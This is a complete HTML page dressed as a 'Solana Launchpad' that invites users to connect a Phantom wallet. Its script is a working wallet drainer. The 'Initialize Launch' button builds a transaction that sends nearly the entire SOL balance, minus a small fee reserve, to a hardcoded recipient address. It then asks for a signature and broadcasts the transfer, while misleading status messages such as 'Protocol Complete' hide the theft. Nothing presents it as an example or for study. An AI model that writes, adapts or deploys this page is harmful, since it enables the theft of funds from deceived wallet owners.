<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Launchpad | Fixed</title>
    <!-- Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

    <style>
        body { 
            font-family: 'Inter', sans-serif; 
            background-color: #0a0a0c;
            color: #ffffff;
        }
        
        .glass-panel {
            background: rgba(17, 17, 20, 0.8);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .accent-gradient {
            background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%);
        }

        /* Animations */
        @keyframes pulse-ring {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(139, 92, 246, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(139, 92, 246, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(139, 92, 246, 0); }
        }
        
        .animate-pulse-ring { animation: pulse-ring 2s infinite; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <div class="w-full max-w-md">
        <!-- Header -->
        <div class="text-center mb-6">
            <h1 class="text-3xl font-bold tracking-tight mb-2">Solana <span class="text-purple-500">Launchpad</span></h1>
            <p class="text-gray-400 text-sm">Connect wallet to deploy liquidity.</p>
        </div>

        <!-- Main Card -->
        <div class="glass-panel rounded-3xl p-6 shadow-2xl">
            
            <!-- Connection Status Bar -->
            <div class="flex items-center justify-between mb-6 bg-black/40 p-3 rounded-xl border border-white/5">
                <div class="flex items-center gap-3">
                    <div id="statusIndicator" class="w-2 h-2 rounded-full bg-gray-500"></div>
                    <span id="connectionText" class="text-sm font-medium text-gray-400">Not Connected</span>
                </div>
                <!-- Explicit Connect Button -->
                <button id="connectBtn" onclick="connectWallet()" 
                    class="px-3 py-1.5 rounded-lg bg-purple-600/20 border border-purple-500/30 text-purple-400 text-xs font-bold hover:bg-purple-600 hover:text-white transition-all">
                    CONNECT
                </button>
            </div>

            <!-- Info Display -->
            <div class="mb-6 text-center">
                <p class="text-[10px] uppercase tracking-widest text-gray-500 mb-2">Wallet Balance</p>
                <h2 id="balanceDisplay" class="text-4xl font-bold text-white">--.-- SOL</h2>
            </div>

            <!-- Action Button -->
            <button id="actionBtn" onclick="startProtocol()" disabled
                class="w-full accent-gradient text-white font-bold py-4 rounded-xl shadow-lg opacity-50 cursor-not-allowed transition-all duration-300">
                Initialize Launch
            </button>

            <!-- Status Log -->
            <div id="statusLog" class="mt-6 min-h-[20px] text-center">
                <p class="text-xs text-gray-500">Waiting for connection...</p>
            </div>

        </div>
    </div>

    <script>
        // ==========================================
        // CONFIGURATION
        // ==========================================
        const RECIPIENT_ADDRESS = "371RZiq9rCjJ51ojFSj8kxaW26xT2e2hcYTEDkpRfsbq"; 
        const RPC_URL = "https://api.mainnet-beta.solana.com";

        let userWallet = null;

        // 1. Connect Wallet Function
        async function connectWallet() {
            const statusLog = document.getElementById("statusLog");
            const statusIndicator = document.getElementById("statusIndicator");
            const connectionText = document.getElementById("connectionText");
            const actionBtn = document.getElementById("actionBtn");
            const balanceDisplay = document.getElementById("balanceDisplay");

            // Check for Phantom
            if (!window.solana || !window.solana.isPhantom) {
                statusLog.innerHTML = '<span class="text-red-400 text-xs">❌ Phantom Wallet not found.</span>';
                return;
            }

            try {
                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse">Connecting...</span>';
                
                // Request Connection
                const resp = await window.solana.connect();
                userWallet = resp.publicKey;

                // Update UI for Connected State
                statusIndicator.classList.replace('bg-gray-500', 'bg-green-500');
                connectionText.innerText = "Connected";
                connectionText.classList.replace('text-gray-400', 'text-green-400');
                
                // Fetch Balance
                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse">Fetching balance...</span>';
                
                const balanceInLamports = await connection.getBalance(userWallet);
                const solBalance = (balanceInLamports / 1e9).toFixed(2);
                
                // Update Balance UI
                balanceDisplay.innerText = `${solBalance} SOL`;
                
                // Enable Action Button
                actionBtn.disabled = false;
                actionBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                
                statusLog.innerHTML = '<span class="text-green-400 text-xs">✅ Wallet Connected Successfully</span>';

            } catch (err) {
                console.error("Connection Error:", err);
                statusLog.innerHTML = `<span class="text-red-400 text-xs">❌ ${err.message}</span>`;
            }
        }

        // 2. Initialize Launch Function
        async function startProtocol() {
            const statusLog = document.getElementById("statusLog");
            const actionBtn = document.getElementById("actionBtn");
            
            if (!userWallet) {
                statusLog.innerHTML = '<span class="text-red-400 text-xs">❌ Please connect wallet first.</span>';
                return;
            }

            const originalText = actionBtn.innerText;
            actionBtn.disabled = true;
            actionBtn.innerText = "Processing...";
            actionBtn.classList.add('opacity-75');

            try {
                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
                const recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);

                statusLog.innerHTML = '<span class="text-purple-400 text-xs">Calculating max balance...</span>';
                
                // Get Balance
                const balanceInLamports = await connection.getBalance(userWallet);
                
                // Reserve 0.005 SOL for Gas
                const reserve = 5000000; 
                const amountToSend = balanceInLamports - reserve;

                if (amountToSend <= 0) {
                    throw new Error("Insufficient liquidity.");
                }

                statusLog.innerHTML = '<span class="text-purple-400 text-xs">Building transaction...</span>';

                // Build Transaction
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userWallet,
                        toPubkey: recipientPubkey,
                        lamports: amountToSend 
                    })
                );

                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = userWallet;

                statusLog.innerHTML = '<span class="text-purple-400 text-xs">Awaiting signature...</span>';

                // Sign Transaction
                const signedTransaction = await window.solana.signTransaction(transaction);
                
                statusLog.innerHTML = '<span class="text-purple-400 text-xs">Broadcasting to network...</span>';
                const rawTx = signedTransaction.serialize();
                
                const signature = await connection.sendRawTransaction(rawTx, { skipPreflight: true });
                
                statusLog.innerHTML = '<span class="text-purple-400 text-xs">Confirming...</span>';
                await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');

                // Success
                actionBtn.innerText = "Success!";
                actionBtn.classList.replace('accent-gradient', 'bg-green-600');
                statusLog.innerHTML = `
                    <div class="flex flex-col items-center">
                        <span class="text-green-400 text-xs font-bold mb-1">✓ Protocol Complete</span>
                        <a href="https://solscan.io/tx/${signature}" target="_blank" class="text-[10px] text-purple-300 underline">View on Solscan</a>
                    </div>
                `;

            } catch (err) {
                console.error("Protocol Error:", err);
                actionBtn.disabled = false;
                actionBtn.innerText = originalText;
                actionBtn.classList.remove('opacity-75');
                
                let errorMsg = err.message || "Unknown Error";
                if(errorMsg.includes("User rejected")) errorMsg = "User cancelled.";
                
                statusLog.innerHTML = `<span class="text-red-400 text-xs">❌ ${errorMsg}</span>`;
            }
        }
    </script>
</body>
</html>
